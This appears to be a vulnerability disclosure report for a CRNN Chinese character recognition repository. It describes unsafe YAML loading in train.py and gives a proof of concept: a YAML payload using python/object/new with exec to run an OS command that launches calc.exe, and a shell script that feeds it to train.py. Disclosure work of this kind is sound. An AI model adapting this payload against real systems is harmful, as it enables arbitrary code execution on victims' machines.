## ✍️ Description
A Chinese characters recognition repository based on convolutional recurrent networks.
* **Vulnerability description**
Vulnerable to YAML deserialization attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
* create and run exploit.sh and exploit.yml as shown below
* vulnerable part of code
```
https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec/blob/stable/train.py#L26
```
* exploit.yml
```YAML
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
```
* exploit.sh
```bash
#!/bin/bash
git clone https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec.git
cd CRNN_Chinese_Characters_Rec
python3 train.py --cfg path_to_exploit.yml
```
